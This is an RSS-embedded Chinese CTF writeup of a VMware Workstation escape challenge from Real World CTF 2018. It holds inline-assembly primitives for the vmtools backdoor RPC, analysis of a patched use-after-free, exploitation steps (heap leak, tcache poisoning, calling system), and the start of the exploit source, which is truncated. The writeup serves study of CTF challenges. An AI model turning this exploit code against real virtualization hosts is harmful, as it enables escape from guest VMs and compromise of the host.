<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Wed, 12 Dec 2018 13:22:36 +0800</lastBuildDate>
<item>
<title>Real World CTF 2018 Finals Station-Escape Writeup</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-11-52140921.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/52140921&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-109690a7eff1cc6e46d439e585195c5c_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;by r3kapig&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;RWCTF Final是我们觉得非常不错的一次竞赛，非常贴近实战，其中每道题目都值得深入研究。其中Station-Escape是一道VMWare Workstation逃逸的题目，我们觉得非常cool，所以进行了详细分析，这里非常感谢&lt;b&gt;长亭科技&lt;/b&gt;的&lt;b&gt;flyyy&lt;/b&gt;师傅贡献的非常优秀的题目和悉心的技术指导。本文分析工作由&lt;b&gt;r3kapig&lt;/b&gt;的&lt;b&gt;Ne0&lt;/b&gt;和&lt;b&gt;bibi&lt;/b&gt;完成。&lt;/blockquote&gt;&lt;h2&gt;前置知识&lt;/h2&gt;&lt;p&gt;在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
MOV EAX, 564D5868h                      /* magic number     */
MOV EBX, command-specific-parameter
MOV CX,  backdoor-command-number
MOV DX,  5658h                          /* VMware I/O Port  */

IN  EAX, DX (or OUT DX, EAX)
&lt;/code&gt;&lt;p&gt;首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。&lt;/p&gt;&lt;p&gt;backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+------------------+
     | Open RPC channel |
     +---------+--------+
               |
  +------------v-----------+
  | Send RPC command length|
  +------------+-----------+
               |
  +------------v-----------+
  | Send RPC command data  |
  +------------+-----------+
               |
 +-------------v------------+
 | Recieve RPC reply length |
 +-------------+------------+
               |
  +------------v-----------+
  | Receive RPC reply data |
  +------------+-----------+
               |
+--------------v-------------+
| Finish receiving RPC reply |
+--------------+-------------+
               |
     +---------v---------+
     | Close RPC channel |
     +-------------------+&lt;/code&gt;&lt;blockquote&gt;以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：&lt;a href=&quot;https://sites.google.com/site/chitchatvmback/backdoor&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/a&gt;&lt;/blockquote&gt;&lt;h2&gt;Open RPC channel&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：00h&lt;/blockquote&gt;&lt;p&gt;调用IN（OUT）前，需要设置的寄存器内容：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = 49435052h - RPC open magic number (&#39;RPCI&#39;)
ECX(HI) = 0000h - subcommand number
ECX(LO) = 001Eh - command number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00010000h: success / 00000000h: failure
EDX(HI) = RPC channel number&lt;/code&gt;&lt;p&gt;该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（&lt;code class=&quot;inline&quot;&gt;#0 - #7&lt;/code&gt;）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。&lt;/p&gt;&lt;p&gt;我们可以使用如下函数实现Open RPC channel的过程：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
	 asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rdi,%%r10\n\t&quot;
                &quot;movq %%rsi,%%r11\n\t&quot;
                &quot;movq %%rdx,%%r12\n\t&quot;
		&quot;movq %%rcx,%%r13\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0xc9435052,%%ebx\n\t&quot;
                &quot;movl $0x1e,%%ecx\n\t&quot;
                &quot;movl $0x5658,%%edx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%edi,(%%r10)\n\t&quot;
                &quot;movl %%esi,(%%r11)\n\t&quot;
                &quot;movl %%edx,(%%r12)\n\t&quot;
		&quot;movl %%ecx,(%%r13)\n\t&quot;
		:
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Send RPC command length&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：01h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = command length (not including the terminating NULL)
ECX(HI) = 0001h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00810000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
		&quot;movq %%r8,%%r10\n\t&quot;
                &quot;movl %%ecx,%%ebx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0001001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
        	:&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
	);
}
&lt;/code&gt;&lt;h2&gt;Send RPC command data&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：02h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = 4 bytes from the command data (the first byte in LSB)
ECX(HI) = 0002h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 000010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令&lt;code class=&quot;inline&quot;&gt;machine.id.get&lt;/code&gt;，那么必须要调用4次，分别为：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EBX set to 6863616Dh (&quot;mach&quot;)
EBX set to 2E656E69h (&quot;ine.&quot;)
EBX set to 672E6469h (&quot;id.g&quot;)
EBX set to 00007465h (&quot;et\x00\x00&quot;)
&lt;/code&gt;&lt;p&gt;ECX会返回是否成功，具体实现如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
	asm(&quot;pushq %%rbp\n\t&quot;
                &quot;movq %%r9,%%r10\n\t&quot;
		&quot;movq %%r8,%%rbp\n\t&quot;
		&quot;movq %%rcx,%%r11\n\t&quot;
		&quot;movq $0,%%r12\n\t&quot;
		&quot;1:\n\t&quot;
		&quot;movq %%r8,%%rbp\n\t&quot;
		&quot;add %%r12,%%rbp\n\t&quot;
		&quot;movl (%%rbp),%%ebx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0002001e,%%ecx\n\t&quot;
		&quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
		&quot;addq $4,%%r12\n\t&quot;
		&quot;cmpq %%r12,%%r11\n\t&quot;
		&quot;ja 1b\n\t&quot;
		&quot;movl %%ecx,(%%r10)\n\t&quot;
		&quot;popq %%rbp\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Recieve RPC reply length&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：03h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
ECX(HI) = 0003h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EBX = reply length (not including the terminating NULL)
ECX = 00830000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中&lt;code class=&quot;inline&quot;&gt;1&lt;/code&gt;表示&lt;code class=&quot;inline&quot;&gt;success&lt;/code&gt;,&lt;code class=&quot;inline&quot;&gt;0&lt;/code&gt;表示&lt;code class=&quot;inline&quot;&gt;failure&lt;/code&gt;，即使VMware无法识别RPC command，也会返回&lt;code class=&quot;inline&quot;&gt;0 Unknown command&lt;/code&gt;作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%r8,%%r10\n\t&quot;
                &quot;movq %%rcx,%%r11\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0003001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
		&quot;movl %%ebx,(%%r11)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
        );
		
}
&lt;/code&gt;&lt;h2&gt;Receive RPC reply data&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：04h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0004h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EBX = 4 bytes from the reply data (the first byte in LSB)
ECX = 00010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;和&lt;code class=&quot;inline&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/code&gt;中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在&lt;code class=&quot;inline&quot;&gt;Recieve RPC reply length&lt;/code&gt;中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问&lt;code class=&quot;inline&quot;&gt;machine.id.get&lt;/code&gt;，如果成功的话，会返回&lt;code class=&quot;inline&quot;&gt;1 &amp;lt;virtual machine id&amp;gt;&lt;/code&gt;，否则为&lt;code class=&quot;inline&quot;&gt;0 No machine id&lt;/code&gt;。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
	asm(&quot;pushq %%rbp\n\t&quot;
                &quot;movq %%r9,%%r10\n\t&quot;
                &quot;movq %%r8,%%rbp\n\t&quot;
                &quot;movq %%rcx,%%r11\n\t&quot;
                &quot;movq $1,%%rbx\n\t&quot;
		&quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0004001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;in %%dx,%%eax\n\t&quot;
		&quot;add %%r11,%%rbp\n\t&quot;
                &quot;movl %%ebx,(%%rbp)\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                &quot;popq %%rbp\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Finish receiving RPC reply&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：05h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0005h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过&lt;code class=&quot;inline&quot;&gt;Receive RPC reply data&lt;/code&gt;接收完整个reply数据的话，就会返回failure。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
		&quot;movq $0x1,%%rbx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0005001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Close RPC channel&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：06h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
ECX(HI) = 0006h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;关闭channel。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0006001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;虽然是RealWorld的竞赛，但是因为是魔改的VMWare Workstation，因此我们通过二进制比对的方式可以快速定位到漏洞点，节省大量的二进制程序审计和漏洞挖掘的时间。&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-11b9dd2df64de27dfc3d95bf6d0fbaeb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;98&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11b9dd2df64de27dfc3d95bf6d0fbaeb&quot; data-watermark-src=&quot;v2-43e396613fc9d1538cda308aa2f285ea&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可以发现出题人仅仅修改了两处，一处在0x1893c9，另一处在0x1893e6。分别对两个位置进行分析：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9ab45eb7842b3564ab2a74edce782ae6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;115&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ab45eb7842b3564ab2a74edce782ae6&quot; data-watermark-src=&quot;v2-d644da4953a25ed3d32e9584deaf3273&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;首先在0x1893c9处，channel-&amp;gt;out_msg_buf置null的操作被nop掉了：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-57a1fd9b5d741fc17f23632baf84f4c0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;192&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-57a1fd9b5d741fc17f23632baf84f4c0&quot; data-watermark-src=&quot;v2-33ec580462e549d3c2900a0beba4345e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;其次在0x1893e6处的函数调用中，v7&amp;amp;1变成了v7&amp;amp;0x21：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c4b0a295f323919165bbf2b1072c904b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;596&quot; data-rawheight=&quot;68&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;在第一处patch中，out_msg_buf没有被置空，其次在第二处patch中，原先被限制的reply type(&amp;amp;0x1)变成了&amp;amp;0x21,也就是说，我们在Finish receiving RPC reply的reply type中可以设置另外一条路径，这条路径会导致在随后的&lt;code class=&quot;inline&quot;&gt;v6&lt;/code&gt;这个调用(它会call函数&lt;code class=&quot;inline&quot;&gt;sub_177700&lt;/code&gt;)，&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;被&lt;code class=&quot;inline&quot;&gt;free&lt;/code&gt;掉。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9b42079bc70985838aab4885e2d58353_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;112&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9b42079bc70985838aab4885e2d58353&quot; data-watermark-src=&quot;v2-6bd011e5aa1a8517146ed58108e6cb9b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
        asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
                &quot;movq $0x21,%%rbx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0005001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;由上面的分析可以知，这个patch会导致&lt;code class=&quot;inline&quot;&gt;UAF&lt;/code&gt;:如果我们在接收完成之后设置了&lt;code class=&quot;inline&quot;&gt;0x20&lt;/code&gt;这个位，那么&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;就会被释放掉，但由于它没有被清零，所以理论上我们可以无限次的将它&lt;code class=&quot;inline&quot;&gt;free&lt;/code&gt;掉。有了这些条件，我们要完成整个利用就不难了。&lt;/p&gt;&lt;p&gt;利用步骤如下:&lt;br&gt;&lt;code class=&quot;inline&quot;&gt;Leak:&lt;/code&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开两个&lt;code class=&quot;inline&quot;&gt;channel:A，B&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;,然后&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;释放&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;&lt;/li&gt;&lt;li&gt;这时让&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;准备给&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;发&lt;code class=&quot;inline&quot;&gt;output&lt;/code&gt;,&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;会分配一个&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;，我们利用&lt;code class=&quot;inline&quot;&gt;info-set&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;info-get&lt;/code&gt;来控制我们分配的&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;大小，使得&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;output buffer: buf_B=buf_A&lt;/code&gt;。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;再次释放&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;，这也导致了&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;被释放。这个时候我们就可以&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;出&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;fd&lt;/code&gt;了,但是这个指针没有什么用，我们想要的是&lt;code class=&quot;inline&quot;&gt;text base&lt;/code&gt;。&lt;/li&gt;&lt;li&gt;因此我们再执行命令&lt;code class=&quot;inline&quot;&gt;vmx.capability.dnd_version&lt;/code&gt;,这会让&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;分配一块内存来存放一个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;,通过控制&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;大小我们可以刚好让&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;被用来存放一个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;。而这个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;里面有&lt;code class=&quot;inline&quot;&gt;vtable&lt;/code&gt;,我们可以&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;出来计算&lt;code class=&quot;inline&quot;&gt;text base&lt;/code&gt;。注意我们一直没有接受&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;的输出，只是让它做好准备(分配output buffer)。直到这个时候我们才接受它的输出，完成&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;Exploit&lt;/code&gt;&lt;/p&gt;&lt;p&gt;有了&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;的方法，&lt;code class=&quot;inline&quot;&gt;exploit&lt;/code&gt;的也是类似的了。简单来说就是&lt;code class=&quot;inline&quot;&gt;UAF&lt;/code&gt;，把&lt;code class=&quot;inline&quot;&gt;tcache&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;fd&lt;/code&gt;改到&lt;code class=&quot;inline&quot;&gt;bss&lt;/code&gt;段，然后改函数指针为&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;,最后弹&lt;code class=&quot;inline&quot;&gt;calculator&lt;/code&gt;&lt;/p&gt;&lt;p&gt;我给作者的exp加上了注释，大家可以参考:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rdi,%%r10\n\t&quot;
        &quot;movq %%rsi,%%r11\n\t&quot;
        &quot;movq %%rdx,%%r12\n\t&quot;
        &quot;movq %%rcx,%%r13\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0xc9435052,%%ebx\n\t&quot;
        &quot;movl $0x1e,%%ecx\n\t&quot;
        &quot;movl $0x5658,%%edx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%edi,(%%r10)\n\t&quot;
        &quot;movl %%esi,(%%r11)\n\t&quot;
        &quot;movl %%edx,(%%r12)\n\t&quot;
        &quot;movl %%ecx,(%%r13)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
       );
}

void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
        &quot;movl %%ecx,%%ebx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0001001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}

void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
        &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $0,%%r12\n\t&quot;
        &quot;1:\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;add %%r12,%%rbp\n\t&quot;
        &quot;movl (%%rbp),%%ebx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0002001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;addq $4,%%r12\n\t&quot;
        &quot;cmpq %%r12,%%r11\n\t&quot;
        &quot;ja 1b\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}

void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0003001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
